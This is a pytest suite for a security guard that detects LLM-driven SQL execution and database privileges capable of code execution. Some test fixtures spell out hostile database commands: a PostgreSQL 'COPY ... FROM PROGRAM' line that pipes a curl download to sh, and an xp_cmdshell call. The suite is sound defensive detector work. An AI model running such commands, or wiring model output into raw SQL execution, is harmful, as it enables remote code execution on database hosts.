from __future__ import annotations

from agentsec.guards.llm_query_engine_execution import LlmQueryEngineExecutionGuard
from tests.guards._common import *  # noqa: F401,F403


def _prof(tmp_path: Path) -> object:
    return mkprofile(tmp_path, features={"python", "llm"})


def test_llm_query_engine_execution_fires_on_nlsql_engine(tmp_path: Path) -> None:
    (tmp_path / "query.py").write_text(
        "from llama_index.core.query_engine import NLSQLTableQueryEngine\n"
        "engine = NLSQLTableQueryEngine(sql_database=sql_database)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 1
    assert findings[0].rule == "llm-query-engine-execution/text-to-sql-engine"
    assert findings[0].severity == "medium"


def test_llm_query_engine_execution_fires_on_pandas_engine(tmp_path: Path) -> None:
    (tmp_path / "query.py").write_text(
        "from llama_index.experimental.query_engine import PandasQueryEngine\n"
        "engine = PandasQueryEngine(df=df)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 1
    assert findings[0].rule == "llm-query-engine-execution/pandas-code-exec-engine"


def test_llm_query_engine_execution_fires_on_langchain_sql_agent(tmp_path: Path) -> None:
    (tmp_path / "agent.py").write_text(
        "from langchain_community.agent_toolkits import create_sql_agent\n"
        "agent = create_sql_agent(llm=llm, db=db)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 1
    assert findings[0].rule == "llm-query-engine-execution/text-to-sql-engine"


def test_llm_query_engine_execution_silent_on_unrelated_class(tmp_path: Path) -> None:
    (tmp_path / "query.py").write_text(
        "from llama_index.core.query_engine import RetrieverQueryEngine\n"
        "engine = RetrieverQueryEngine(retriever=retriever)\n",
        encoding="utf-8",
    )
    assert LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path)) == []


def test_llm_query_engine_execution_pragma_silences(tmp_path: Path) -> None:
    (tmp_path / "query.py").write_text(
        "# security: allow-llm-query-engine-execution\n"
        "from llama_index.core.query_engine import NLSQLTableQueryEngine\n"
        "engine = NLSQLTableQueryEngine(sql_database=sql_database)\n",
        encoding="utf-8",
    )
    assert LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path)) == []


def test_llm_query_engine_execution_fires_on_raw_sql_exec_rpc(tmp_path: Path) -> None:
    # The flagship shape: an @agent.tool forwards an LLM-authored str to a raw-SQL-exec RPC.
    (tmp_path / "tool.py").write_text(
        "@agent.tool\n"
        "async def execute_sql_query(ctx, sql_query: str) -> str:\n"
        "    return await ctx.deps.supabase.rpc('execute_custom_sql', {'query': sql_query}).execute()\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 1
    assert findings[0].rule == "llm-query-engine-execution/raw-sql-exec-rpc"
    assert findings[0].severity == "medium"


def test_llm_query_engine_execution_raw_sql_rpc_name_variants(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text('r = client.rpc("exec_sql", {"q": q})\n', encoding="utf-8")
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["llm-query-engine-execution/raw-sql-exec-rpc"]


def test_llm_query_engine_execution_silent_on_benign_rpc(tmp_path: Path) -> None:
    # A normal RPC to a named, non-SQL-executor function must NOT fire.
    (tmp_path / "ok.py").write_text(
        "res = supabase.rpc('get_user_stats', {'uid': uid}).execute()\n",
        encoding="utf-8",
    )
    assert LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path)) == []


def test_llm_query_engine_execution_raw_sql_rpc_pragma_silences(tmp_path: Path) -> None:
    (tmp_path / "tool.py").write_text(
        "res = supabase.rpc('execute_custom_sql', {'query': q})  "
        "# security: allow-llm-query-engine-execution\n",
        encoding="utf-8",
    )
    assert LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path)) == []


def test_llm_query_engine_execution_not_applies_without_llm(tmp_path: Path) -> None:
    profile = mkprofile(tmp_path, features={"python"})
    assert LlmQueryEngineExecutionGuard().applies(profile) is False


def test_llm_query_engine_execution_not_applies_without_python(tmp_path: Path) -> None:
    profile = mkprofile(tmp_path, features={"llm"})
    assert LlmQueryEngineExecutionGuard().applies(profile) is False


def test_llm_query_engine_execution_both_rules_in_same_file(tmp_path: Path) -> None:
    (tmp_path / "multi.py").write_text(
        "from llama_index.core.query_engine import NLSQLTableQueryEngine\n"
        "from llama_index.experimental.query_engine import PandasQueryEngine\n"
        "sql_engine = NLSQLTableQueryEngine(sql_database=sql_database)\n"
        "pandas_engine = PandasQueryEngine(df=df)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "llm-query-engine-execution/text-to-sql-engine" in rules
    assert "llm-query-engine-execution/pandas-code-exec-engine" in rules


def test_llm_query_engine_execution_pragma_in_docstring_does_not_suppress(tmp_path: Path) -> None:
    # #305 review: the pragma is a `#`-comment regex, not a plain `in text` check — the pragma
    # text appearing in a docstring/string must NOT suppress the whole file.
    (tmp_path / "eng.py").write_text(
        '"""Doc mentioning security: allow-llm-query-engine-execution in prose."""\n'
        "engine = NLSQLTableQueryEngine(sql_database=db)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert "llm-query-engine-execution/text-to-sql-engine" in {f.rule for f in findings}


def test_llm_query_engine_execution_documented_pragma_form_in_docstring_does_not_suppress(tmp_path: Path) -> None:
    # #424: the test above quotes the phrase WITHOUT its `#`, which the `#`-prefixed regex never
    # matched anyway — the shape that actually silenced the file is a docstring quoting the
    # documented `# security: …` form itself. The comment view sees no comment in a docstring.
    (tmp_path / "eng.py").write_text(
        '"""Opt out with `# security: allow-llm-query-engine-execution` on the engine line."""\n'
        "engine = NLSQLTableQueryEngine(sql_database=db)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert "llm-query-engine-execution/text-to-sql-engine" in {f.rule for f in findings}


def test_llm_query_engine_execution_real_pragma_suppresses(tmp_path: Path) -> None:
    (tmp_path / "eng.py").write_text(
        "engine = NLSQLTableQueryEngine(sql_database=db)  # security: allow-llm-query-engine-execution\n",
        encoding="utf-8",
    )
    assert LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path)) == []


# ── Extension: llm-output-as-sql-query (framework-agnostic taint flow, CVE-2026-25879) ──────────

def test_llm_output_passed_to_cursor_execute_fires(tmp_path: Path) -> None:
    (tmp_path / "chat_sql.py").write_text(
        "def handle_question(prompt):\n"
        "    generated_sql = llm.invoke(prompt)\n"
        "    cursor.execute(generated_sql)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == "llm-query-engine-execution/llm-output-as-sql-query")
    assert hit.severity == "medium"


def test_llm_output_via_chat_completions_create_fires(tmp_path: Path) -> None:
    (tmp_path / "chat_sql.py").write_text(
        "def handle_question(prompt):\n"
        "    resp = client.chat.completions.create(model='gpt-4', messages=[{'role': 'user', 'content': prompt}])\n"
        "    sql_text = resp.choices[0].message.content\n"
        "    session.execute(sql_text)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "llm-query-engine-execution/llm-output-as-sql-query" for f in findings)


def test_non_llm_variable_passed_to_execute_stays_silent(tmp_path: Path) -> None:
    """FP-bait: an ordinary, non-LLM-derived variable passed to a SQL-execute call must not fire —
    only a variable this guard traced back to an LLM-response-shaped assignment qualifies."""
    (tmp_path / "chat_sql.py").write_text(
        "def handle_question(prompt):\n"
        "    query = 'SELECT 1'\n"
        "    cursor.execute(query)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == "llm-query-engine-execution/llm-output-as-sql-query" for f in findings)


def test_llm_output_not_reaching_sql_exec_stays_silent(tmp_path: Path) -> None:
    """FP-bait: an LLM-response variable that is never passed to a SQL-execute call must not fire."""
    (tmp_path / "chat.py").write_text(
        "def handle_question(prompt):\n"
        "    answer = llm.invoke(prompt)\n"
        "    return answer\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == "llm-query-engine-execution/llm-output-as-sql-query" for f in findings)


def test_llm_output_variable_from_different_function_stays_silent(tmp_path: Path) -> None:
    """FP-bait: the taint correlation is scoped to a single function — a same-named variable in a
    DIFFERENT function that never itself assigned from an LLM-response-shaped RHS must not fire."""
    (tmp_path / "chat_sql.py").write_text(
        "def get_answer(prompt):\n"
        "    generated_sql = llm.invoke(prompt)\n"
        "    return generated_sql\n"
        "\n"
        "\n"
        "def run_query(generated_sql):\n"
        "    cursor.execute(generated_sql)\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == "llm-query-engine-execution/llm-output-as-sql-query" for f in findings)


# ── Extension: rce-capable-privilege (CVE-2026-25879) ───────────────────────────────────────────

def test_copy_from_program_literal_fires_high(tmp_path: Path) -> None:
    (tmp_path / "admin.py").write_text(
        "BACKUP_QUERY = \"COPY (SELECT 1) FROM PROGRAM 'curl http://example.com/x.sh | sh'\"\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == "llm-query-engine-execution/rce-capable-privilege")
    assert hit.severity == "high"


def test_xp_cmdshell_literal_fires_high(tmp_path: Path) -> None:
    (tmp_path / "admin.py").write_text(
        "SQL = \"EXEC xp_cmdshell 'dir'\"\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "llm-query-engine-execution/rce-capable-privilege" for f in findings)


def test_superuser_postgres_dsn_fires_high(tmp_path: Path) -> None:
    (tmp_path / "config.py").write_text(
        "DSN = 'postgresql://postgres:secret@db.internal:5432/app'\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == "llm-query-engine-execution/rce-capable-privilege")
    assert hit.severity == "high"


def test_ordinary_copy_statement_stays_silent(tmp_path: Path) -> None:
    """FP-bait: an ordinary COPY (no FROM PROGRAM) must not fire."""
    (tmp_path / "etl.py").write_text(
        "QUERY = \"COPY users TO '/tmp/export.csv' WITH CSV\"\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == "llm-query-engine-execution/rce-capable-privilege" for f in findings)


def test_ordinary_postgres_mention_stays_silent(tmp_path: Path) -> None:
    """FP-bait: an ordinary non-superuser postgres DSN/mention must not fire."""
    (tmp_path / "config.py").write_text(
        "DSN = 'postgresql://app_user:secret@db.internal:5432/app'\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == "llm-query-engine-execution/rce-capable-privilege" for f in findings)


def test_rce_privilege_pragma_suppresses(tmp_path: Path) -> None:
    (tmp_path / "admin.py").write_text(
        "# security: allow-llm-query-engine-execution\n"
        "BACKUP_QUERY = \"COPY (SELECT 1) FROM PROGRAM 'curl http://example.com/x.sh | sh'\"\n",
        encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


_DSN_LINE = "DSN = 'postgresql://postgres:secret@db.internal:5432/app'\n"


def test_rce_privilege_silent_in_test_and_example_paths(tmp_path: Path) -> None:
    """FP-bait: a default `postgres` DSN in a redaction test or a documented local-dev example is
    not production wiring. Test and example trees are not finding anchors for this rule."""
    for rel_path in ("tests/test_redaction.py", "scripts/tests/test_snapshot.py", "examples/memory.py"):
        target = tmp_path / rel_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(_DSN_LINE, encoding="utf-8")
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert [f for f in findings if f.rule.endswith("rce-capable-privilege")] == []


def test_rce_privilege_still_fires_in_product_path_next_to_test_tree(tmp_path: Path) -> None:
    """Still fires (the traded-against direction): the same DSN in application code is reported,
    even when a test tree with the same literal sits beside it."""
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "db.py").write_text(_DSN_LINE, encoding="utf-8")
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_db.py").write_text(_DSN_LINE, encoding="utf-8")
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    hits = [f for f in findings if f.rule.endswith("rce-capable-privilege")]
    assert [f.location.replace("\\", "/") for f in hits] == ["app/db.py:1"]


def test_engine_rules_still_anchor_in_test_paths(tmp_path: Path) -> None:
    """The nonproduct skip is scoped to `rce-capable-privilege` only: the engine-class rules keep
    their existing behaviour under a tests/ tree."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_q.py").write_text(
        "engine = NLSQLTableQueryEngine(sql_database=sql_database)\n", encoding="utf-8",
    )
    findings = LlmQueryEngineExecutionGuard().run(tmp_path, _prof(tmp_path))
    assert [f.rule for f in findings] == ["llm-query-engine-execution/text-to-sql-engine"]
